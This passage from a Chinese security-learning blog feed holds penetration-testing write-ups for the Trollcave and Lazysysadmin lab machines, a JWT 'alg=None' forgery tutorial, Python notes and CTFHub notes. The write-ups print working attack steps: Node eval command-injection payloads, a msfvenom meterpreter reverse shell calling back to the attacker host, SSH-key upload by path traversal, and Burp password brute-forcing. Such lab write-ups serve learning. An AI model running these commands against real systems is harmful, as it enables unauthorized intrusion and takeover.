-A</code></pre><p>关于-P0：</p><p>无ping扫描可以躲避某些防火墙的防护，可以在目标主机禁止ping的情况下使用。</p><p>用-P0禁止主机发现会使Nmap对每一个指令的目标IP地址进行所要求的扫描，可以穿透防火墙，也可以避免被防火墙发现。</p><p>得到端口：</p><p>20：ssh</p><p>80：HTTP</p><h2 id="3-逻辑缺陷分析"><a href="#3-逻辑缺陷分析" class="headerlink" title="3.逻辑缺陷分析"></a>3.逻辑缺陷分析</h2><h3 id="1-分析网站的功能"><a href="#1-分析网站的功能" class="headerlink" title="1.分析网站的功能"></a>1.分析网站的功能</h3><p>1.注册不可用</p><p>2.网站用户的权限：</p><p>King：superadmin</p><p>coderguy：admin</p><p>3.修改（重置）密码的路径暴露了：</p><p>password_resets</p><pre><code>所以我最近收到了很多用户的电子邮件，他们忘记了密码，需要重新设置。因为这个网站没有“忘记密码”按钮，我不得不手动重置。我真的厌倦了，所以是时候实施密码重置了。目前正忙于此事，但网站电子邮件有问题。您可能已经注意到，由于这个原因，新用户的激活已被关闭。到目前为止，我已经在rails中实现了一个password_resets资源（implemented a password_resets resource in rails），除了电子邮件之外，它的工作效率大约是90%。非常令人沮丧。如果有人对如何让电子邮件正常工作有任何建议，请给我发一封</code></pre><p>这里也就是说已经通过发送邮件的方式来进行修改密码</p><p>而且是基于rail来实现的</p><h3 id="2-从功能上分析逻辑漏洞"><a href="#2-从功能上分析逻辑漏洞" class="headerlink" title="2.从功能上分析逻辑漏洞"></a>2.从功能上分析逻辑漏洞</h3><p>1.重置密码漏洞：</p><p>①漏洞发现，发现重置密码的路径</p><p>②漏洞利用，修改超级管理员的密码</p><h2 id="4-利用漏洞"><a href="#4-利用漏洞" class="headerlink" title="4.利用漏洞"></a>4.利用漏洞</h2><p>1.经过对implemented a password_resets resource in rails资料查阅(这里有两个关键词password_resets和rails，google一下，发现这么一个网站<a href="https://www.railstutorial.org/book/password_reset)：" target="_blank" rel="noopener">https://www.railstutorial.org/book/password_reset)：</a></p><p>/password_resets/new可以对member成员的密码进行修改但是对King无法进行修改</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer</a></p><img src="http://images2.5666888.xyz//搜狗截图20年12月28日1441_1.png" style="zoom:80%;"><p>2.但是这里存在一个垂直越权的漏洞：</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King</a></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51446_3.png" alt></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51445_2.png" alt></p><p>说明已经将King的密码成功修改了</p><p>然后登陆：success！！！</p><p>3.接下来开始利用superadmin来对该网页进行学习（嘿嘿嘿）</p><p>①创建ssh公钥：</p><p>a.在攻击机利用ssh命令创建一个public key，来连接靶机上你先要连接的用户</p><p>通过信息收集：</p><p><u>嘿，伙计，如果我要在网站上做更多的工作，我真的需要sudo访问。我也不知道对我来说交互使用rails用户是一个多好的主意，也许我们应该分开，我梦寐以求的coderguy in /etc/sudoers…</u></p><p>得到用户：<strong>rails</strong></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51557_4.png" alt></p><p>然后收集到一个路径：/home/rails/.ssh/<u>authorized_keys</u>这个地方是文件名可以自行修改</p><p>b.接下来在kali上为其创建公钥</p><pre><code>ssh-keygen -C（为所创建的公钥做注释）rails@192.168.204.140</code></pre><p>②把public key上 传到靶机上：</p><p>a.利用文件上传</p><p>b.按公钥存储的路径（默认Default）上传公钥</p><p><strong>../../../../../../home/rails/.ssh/authorized_keys</strong>（上传的名字）注意这里的名字一定要是authorized_keys</p><p>③在攻击机利用公钥去连接靶机上的用户</p><pre><code>ssh rails@192.168.204.140 -i xxx（此处的名字要与你上传的xxx.pub文件名字相同，不然会连接不上！！！！）Last login: Thu Jul 11 03:57:36 2019 from 192.168.198.136$ ifconfig  inet addr:192.168.204.140$ whoamirails$ ls /homecoderguy  dave    dragon    king  rails          </code></pre><h3 id="5-关键文件代码分析"><a href="#5-关键文件代码分析" class="headerlink" title="5.关键文件代码分析"></a>5.关键文件代码分析</h3><pre><code>$vim /home/king/calc/calc.jshttp.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;)//说明在靶机上创建了一个服务8端口8888分析route（路由）函数：##解释：根据url里面不同的地址，分别调用与之对应的函数来响应function calc(pathname, request, query, response){        sum = query.split(&#39;=&#39;)[1];        #将等号后面的值赋给sum        console.log(sum)        #其实这个方法和alert方法类似，唯一不同的是该方法是显示在控制台的，而alert()方法是显示在浏览器上的        response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});#向请求的客户端发送响应头。 该函数在一个请求内最多只能调用一次，如果不调用，则会自动生成一个响应头。statusCode HTTP状态码，如200(请求成功），404（未找到）等。        response.end(eval(sum).toString());        #停止处理文件的脚本代码，并且返回当前产生的内容}</code></pre><p> response.end(eval(sum).toString());</p><p>eval()执行response对象end（计算公式），之后把计算公式的结果返回到浏览器</p><p>eg：<a href="http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器" target="_blank" rel="noopener">http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器</a></p><p>eg：<a href="http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)" target="_blank" rel="noopener">http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)</a></p><p>这里会通过require（）在本地操作系统上启动一个子进程，然后通过上述子进程去执行（exec）whoami这个shell命令，然后将上述内容房子eval（）里面，结果就会在本地操作系统上真正执行whoami</p><p>踩坑：如果calc.js文件因为操作失误不小心把内容干没了，就重置虚拟机</p><h3 id="6-代码漏洞验证"><a href="#6-代码漏洞验证" class="headerlink" title="6.代码漏洞验证"></a>6.代码漏洞验证</h3><p>接下来使用虚拟机来模拟上述的在URL里面执行的操作</p><p>1.验证8888端口服务是不是启动</p><pre><code>netstat -antp列出当前主机上所有开放的端口|grep 8888只看端口8888是否启动netstat -antp | grep 8888</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51925_5.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=1+1&quot;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51937_6.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;whoani&#39;)&quot;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51941_7.png" alt></p><p>如果命令执行且没有报错，说明可能存在shell上传漏洞，也就是说，有可以利用的反弹shell</p><h3 id="7-生成并上传shell"><a href="#7-生成并上传shell" class="headerlink" title="7.生成并上传shell"></a>7.生成并上传shell</h3><p>这里不会得到命令的输出，而是返回了[object Object]，由此猜测sum参数里的whoami这个命令被执行了，因此可以利用这里触发一个shell。</p><p><strong>1.使用msfvenom创建shell：</strong></p><p>msfvenom -p linux/x64/meterpreter_reverse_tcp  → 设置payload</p><p>-f elf  →  生成格式</p><p>-o shell → 生成路径（输出文件名字）</p><p>LHOST=192.168.110.6   →    Kali地址</p><p>LPORT=6666      →    反弹端口</p><p>先启动msfconsole,之后输入如下命令：</p><pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o demo -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.利用文件漏洞上传shell</p><p>路径：/tmp/demo</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A52034_8.png" alt></p><p>可以看出上传文件成功</p><p>3.反弹shell</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload linux/x64/meterpreter_reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.110.6msf exploit(handler) &gt; set LPORT 6666msf exploit(handler) &gt; run -j</code></pre><pre><code>cd /tmp./yshell</code></pre><p>发现因为权限问题yshell无法反弹</p><p>4.编写启动shell的脚本(在tmp目录下)</p><p>因为rails用户没有上传执行shell的权限</p><pre><code>vim run.sh#!/bin/bashsudo cp /tmp/shell1 /home/king/shell1sudo chown king:king /home/king/shell1(chown： 修改所属用户与组。将shell1拥有者与群组改为king)sudo chmod a+x /home/king/shell1sudo /home/king/shell1</code></pre><p>对chmod命令的回顾：</p><p>符号类型改变文件权限方式：</p><p>还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：</p><ul><li>user：用户</li><li>group：组</li><li>others：其他</li></ul><p>那么我们就可以使用 <strong>u, g, o</strong> 来代表三种身份的权限。</p><p>此外， <strong>a</strong> 则代表 <strong>all</strong>，即全部的身份。读写的权限可以写成 <strong>r, w, x</strong>，也就是可以使用下表的方式来看：</p><table><thead><tr><th align="center">chmod</th><th>u g o a</th><th>+(加入) -(除去) =(设定)</th><th>r w x</th><th>文件或目录</th></tr></thead><tbody><tr><td align="center"></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>如果我们需要将文件权限设置为 <strong>-rwxr-xr–</strong> ，可以使用 <strong>chmod u=rwx,g=rx,o=r 文件名</strong> 来设定:</p><pre><code>#  touch test1    // 创建 test1 文件# ls -al test1    // 查看 test1 默认权限-rw-r--r-- 1 root root 0 Nov 15 10:32 test1# chmod u=rwx,g=rx,o=r  test1    // 修改 test1 权限# ls -al test1-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：</p><pre><code>#  chmod  a-x test1# ls -al test1-rw-r--r-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>5.运行脚本</p><pre><code>./run.sh</code></pre><p>但是因为权限不够，脚本无法运行</p><p>因为/home/king目录下的calc</p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/run.sh&#39;)&quot;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8829%E6%97%A51902_1.png" alt></p><p>然后没有反弹shell</p><p>查看了一下king目录下，并没有yshell，也就是说脚本没有运行</p><pre><code>chmod a+x run.js#赋予可执行权限</code></pre><p>然后再curl成功反弹shell</p><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8802%E6%97%A50052_1.png" alt></p><h2 id="另一种方法（针对ubantu的版本漏洞进行提权）："><a href="#另一种方法（针对ubantu的版本漏洞进行提权）：" class="headerlink" title="另一种方法（针对ubantu的版本漏洞进行提权）："></a>另一种方法（针对ubantu的版本漏洞进行提权）：</h2><h3 id="1-ssh创建好shell"><a href="#1-ssh创建好shell" class="headerlink" title="1.ssh创建好shell"></a>1.ssh创建好shell</h3><p>uname -a得：<br>Linux trollcave 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p><strong>cat /proc/versio</strong>n得：</p><p>Linux version 4.4.0-197-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020</p><p>2.得知ubantu和linux版本信息</p><p>懂<del>~</del></p><pre><code>searchsploit 4.4.0-197</code></pre><p> Exploits: No Result<br>Shellcodes: No Result</p><p>是在下不配了</p><p>百度<a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 本地提权漏洞复测过程</a></p><pre><code>rails@trollcave:/proc/sys/kernel$ cat unprivileged_bpf_disabled 0</code></pre><p><em><em>1，下载poc文件 upstream44.c<br>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></em></em></p><p>下载物理机上传kali上面就行</p><pre><code>root@kali1:~/桌面/trollcave# gcc -o upstream upstream44.c</code></pre><p>复制，利用网站的文件上传漏洞传到/tmp/.Test-unix/666并赋予可执行命令，结果出问题了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazysysadmin渗透初探</title>
      <link href="/2020/12/26/idontcare/"/>
      <url>/2020/12/26/idontcare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单介绍：一个简单的社区宣传网站"><a href="#简单介绍：一个简单的社区宣传网站" class="headerlink" title="简单介绍：一个简单的社区宣传网站"></a>简单介绍：一个简单的社区宣传网站</h1><h2 id="IDontCare渗透测试："><a href="#IDontCare渗透测试：" class="headerlink" title="IDontCare渗透测试："></a>IDontCare渗透测试：</h2><h3 id="1-主机发现："><a href="#1-主机发现：" class="headerlink" title="1.主机发现："></a>1.主机发现：</h3><h4 id="发现主机的ip地址："><a href="#发现主机的ip地址：" class="headerlink" title="发现主机的ip地址："></a>发现主机的ip地址：</h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>-sP被发现主机所有在的网段（通过ping命令）</p><pre><code>nmap -sP 127.0.0.0/24</code></pre><p>根据mac地址00:0C:29:E3:72:75找到ip地址</p><p>192.168.204.13913</p><h3 id="2-服务发现："><a href="#2-服务发现：" class="headerlink" title="2.服务发现："></a>2.服务发现：</h3><h4 id="发现主机上的开放的端口："><a href="#发现主机上的开放的端口：" class="headerlink" title="发现主机上的开放的端口："></a>发现主机上的开放的端口：</h4><pre><code>nmap -sS（半开放式扫描，加快速度） -O(操作系统的信息) -p 1-65536 -T4但是这里我使用：nmap -sS -Pn -n -A 192.168.204.139</code></pre><p>发现端口：</p><p>22（ssh）</p><p>80（http）</p><p>3306（mysql）</p><p>139</p><p>445</p><p>6667</p><p>然后针对得到的端口进行实体化浏览</p><h3 id="3-关键目录扫描："><a href="#3-关键目录扫描：" class="headerlink" title="3.关键目录扫描："></a>3.关键目录扫描：</h3><p>1.根据dirb来对该网站进行扫描来确定他下面有哪一些子目录</p><pre><code>dirb http://192.168.204.139</code></pre><p>发现：</p><p><a href="http://192.168.204.139/phpmyadmin/" target="_blank" rel="noopener">http://192.168.204.139/phpmyadmin/</a></p><p>并没有发现东西，只是一个登陆界面</p><p><a href="http://192.168.204.139/wordpress/" target="_blank" rel="noopener">http://192.168.204.139/wordpress/</a></p><p>发现了一个名字：togie</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52215_1.png" alt></p><h3 id="4-查看是否有共享目录"><a href="#4-查看是否有共享目录" class="headerlink" title="4.查看是否有共享目录"></a>4.查看是否有共享目录</h3><p>1.通过enum4linux来枚举靶机的共享目录</p><pre><code>enum4linux 192.168.204.139</code></pre><p>会发现：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52244_2.png" alt></p><p>share$目录</p><p>并且发现允许使用空参进行登录</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52302_3.png" alt></p><p>3.通过mount命令请求一下共享资源（挂载）</p><pre><code>mount -t cifs -o username=&#39; &#39;,password=&#39;&#39; //192.168.204.139/share$ /mnt这里-t是以什么文件常见文件类型：mtfs（fat，ext）（非网络，基于本地，磁盘等）而cifs（common internet file system）//挂载互联网上的文件（基于网络）-o （选项）想要访问一个共享目录，就要指定该访问用户uname和upasswd以及所在网络的IP，而share$是指访问这个目录/mnt将share$的目录挂载到攻击机的该目录下</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52330_4.png" alt></p><p>挂载成功</p><p>解释：</p><p>CIFS (Common Internet FileSystem) 通用Internet文件系统。使用客户/服务器模式，CIFS是公共的或开放的SMB协议版本，CIFS面向网络连接的共享协议，对网络传输的可靠性要求高，常使用TCP/IP。</p><pre><code>mount [options] &lt;source&gt; &lt;directory&gt;</code></pre><p><strong>-t</strong> vfstype 指定文件系统的类型（通常不必指定。mount 会自动选择正确的类型。）</p><p>常用类型有：<br>光盘或光盘镜像：<strong>iso9660</strong><br>DOS fat16文件系统：<strong>msdos</strong><br>Windows 9x fat32文件系统：<strong>vfat</strong><br>Windows NT ntfs文件系统：<strong>ntfs</strong><br>Mount Windows文件网络共享：<strong>smbfs</strong><br>UNIX(LINUX) 文件网络共享：<strong>nfs</strong></p><p><strong>-o</strong> options 主要用来描述设备或档案的挂接方式。常用的参数有：<br><strong>loop</strong>：用来把一个文件当成硬盘分区挂接上系统<br><strong>ro</strong>：采用只读方式挂接设备<br><strong>rw</strong>：采用读写方式挂接设备<br><strong>iocharset</strong>：指定访问文件系统所用字符集<br><strong>device</strong> 要挂接(mount)的设备。<br><strong>dir</strong>设备在系统上的挂接点(mount point)。</p><h3 id="5-文件分析-ssh登录"><a href="#5-文件分析-ssh登录" class="headerlink" title="5.文件分析-ssh登录"></a>5.文件分析-ssh登录</h3><p>这里查找deetstxt文件发现：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52335_5.png" alt></p><p>得到一个密码12345</p><p>根据上面的wordpress文件发现togie文件发现的用户名</p><p>所以可以尝试ssh连接togie用户</p><pre><code>ssh togie@192.168.204.139</code></pre><p>然后发现登陆成功！</p><p>获取shell！</p><h3 id="6-文件分析-phpmyadmin登录"><a href="#6-文件分析-phpmyadmin登录" class="headerlink" title="6.文件分析-phpmyadmin登录"></a>6.文件分析-phpmyadmin登录</h3><p>### </p><pre><code>root@kali1:~# cd /mntroot@kali1:/mnt# cd wordpress/root@kali1:/mnt/wordpress# lsindex.php        wp-blog-header.php    wp-cron.php        wp-mail.phplicense.txt      wp-comments-post.php  wp-includes        wp-settings.phpreadme.html      wp-config.php         wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.phpwp-admin         wp-content            wp-login.php       xmlrpc.phproot@kali1:/mnt/wordpress# vim wp-cwp-comments-post.php  wp-config-sample.php  wp-cron.phpwp-config.php         wp-content/           root@kali1:/mnt/wordpress# vim wp-config.php</code></pre><p>发现：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52348_6.png" alt></p><p>数据库的登陆名字</p><p>Admin</p><p>和密码</p><p>TogieMYSQL12345^^</p><p>然后进入/phpmyadmin利用上述信息进行登陆</p><p>但是却对权限进行了限制！啥也不好使。。</p><h3 id="7-终极目标：系统提权"><a href="#7-终极目标：系统提权" class="headerlink" title="7.终极目标：系统提权"></a>7.终极目标：系统提权</h3><pre><code>togie@LazySysAdmin:~$ sudo su[sudo] password for togie: root@LazySysAdmin:/home/togie# whoamiroot</code></pre><h3 id="8-最后推一下一个大佬的扫除时刻：（此处并未实操）"><a href="#8-最后推一下一个大佬的扫除时刻：（此处并未实操）" class="headerlink" title="8.最后推一下一个大佬的扫除时刻：（此处并未实操）"></a>8.最后推一下一个大佬的扫除时刻：（此处并未实操）</h3><p>URL=<a href="https://blog.csdn.net/qq_38684504/article/details/89703963" target="_blank" rel="noopener">https://blog.csdn.net/qq_38684504/article/details/89703963</a></p><p>然后根据大佬的wp安排自己一个火狐插件</p><p>wappalyzer</p><p>外加另一个很嗨的wp：</p><p><a href="https://blog.csdn.net/weixin_45557138/article/details/108548437" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45557138/article/details/108548437</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT验证</title>
      <link href="/2020/12/26/jsonweb-token-yan-zheng/"/>
      <url>/2020/12/26/jsonweb-token-yan-zheng/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><p>本节课中详细介绍了JSON Web Token（JWT）中的漏洞的利用。在这个程序中，JWT用于认证，登录成功后，用户将获得一个Cookie的JWT。</p><p>JSON Web Token是一种数据的存储机制，主要有加密和签名的安全机制。</p><p>JWT的格式如下：</p><p>Base64(header).Base64(payload).Base64(signature)</p><p>例如：</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFhYWEiLCJpYXQiOiIxNTI1MzQyMDM3In0</p><p>表示</p><p>{“alg”:”HS256”,”typ”:”JWS”}. {“login”:”aaaa”,”iat”:”1525342037”}.网站对数据设计签名机制</p><p>第三部分是一个签名，网上说的很详细了，此处不进行说明。</p><p>具体操作就是：</p><p>然后将编码格式HS256改为None，将用户名改为admin，然后分别进行Base64编码，并把第三部分去掉（注意不要去掉.）</p><p>{“alg”:”None”,”typ”:”JWS”}. {“login”:”admin”,”iat”:”1525342037”}.</p><p>然后分别对{“alg”:”None”,”typ”:”JWS”}</p><p>{“login”:”admin”,”iat”:”1525342037”}</p><p>进行base64加密，然后将bp抓到的token值替换为刚才加密的值</p><p>ok，已经变成admin用户。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> json web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2020/12/24/python-bi-ji/"/>
      <url>/2020/12/24/python-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8</p><p>2.python最具有特色的就是用缩进来写模块</p><p>3.”””xxx”””这里可以多行print</p><p>4.通过#注释</p><p>5.</p><pre><code>counter = 100#赋值整数型变量miles = 1000.0#赋值浮点型变量name = &quot;iceberg404&quot;#赋值字符串</code></pre><p>6.python五个标准的数据类型：numbers（数字）、string（字符串）、list（列表）、tuple（元组）、dictionary（字典）</p><p>7.</p><pre><code>int 有符号整数型long 长整数（也可以代表八进制和十六进制）float 浮点数complex 复数int（x，[,base]）将x转换为一个整数long（x，[,base]）将x转换为一个长整数float（x，[,base]）将x转换为一个浮点数float（x） 将x转换到一个浮点数str（x） 将对象x转换为字符串tuple（s） 将序列s转换为元组list（s） 将序列s转换为一个列表abs（-10）结果为10#返回数字的绝对值max（x1，x2，x3）#返回给定参数的最大值，参数可以为序列sqrt（x）#返回数字x的平方例：import cmatha=9999999print abs（a）print max （1，2，3，4，5）b=8print cmath.sqrt（b）返回结果：99999995（2.82842712475+0j）&quot;&quot;&quot;当我们在日常生活中编写程序时，我们通常遇到需要使用数学来完成任务的情况。像其他编程语言一样，Python提供了各种基本运算操作，如*代表乘法，%代表求模运算，//代表整除。如果您正在编写一个程序来执行特定任务，如研究周期运动或模拟电路，您将需要使用三角函数以及复数。虽然您不能直接使用这些功能，但您可以先导入两个数学模块来访问它们。这两个模块是math和cmath。第一个模块允许您访问实数的双曲线，三角函数和对数函数，而后者允许您使用复数。&quot;&quot;&quot;</code></pre><p>c+=a等效于c=c+a</p><pre><code>a=20.00b=20if（a is b）  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;输出结果为a==b这是is和==之间的区别，此处由于a是浮点数，所以a不等于整数b，故a不是是b，但是a=b。</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHub随笔</title>
      <link href="/2020/12/23/ctfhub-sui-bi/"/>
      <url>/2020/12/23/ctfhub-sui-bi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><pre><code>题目：HTTP Method is GETUse CTF**B Method, I will give you flag.Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</code></pre><p>意思就是你是get请求，你把这个请求换成CTFHUB就行</p><p>所以抓包直接一把梭</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>题目：</p><pre><code>No Flag here!Give me Flag</code></pre><p>点击发现没有跳转</p><p>二话不说，抓包一把梭了</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p><p>这里状态码变为了302说明进行了重定向</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>直接抓包，本来admin=0，然后给admin赋值=1就行了</p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>得到提示 do u konw admin ?，于是猜测账号是 admin , 那么接下来就只需要爆破密码了。注意看到 HTTP 请求头部的 Authorization 字段，后面的YWFhOmjiYg==用base64 解码后是 aaa:bbb，也就是我们之前输入的账号:密码。</p><p> 使用 BurpSuite 进行基础认证爆破</p><p>（1）将报文发送到 Intruder, 将 Basic后面 base64部分添加为payload position</p><p><img src="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（2）在 Payloads选项卡下，选择 Payload Type为SimpleList,然后在 Payload Options 中点击 load 加载密码字典</p><p><img src="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（3）Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin:</p><p>  Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（4）Payload Encode 取消勾选的 URL-encode, 不然你会看到base64之后的=会被转成 %3d ，你就算爆破到天荒地老也不会出来</p><p><img src="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p><p>（5）Start Attack ，然后按 Length 排序，并看到状态码出现200的，即爆破成功</p><p><img src="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p><p><img 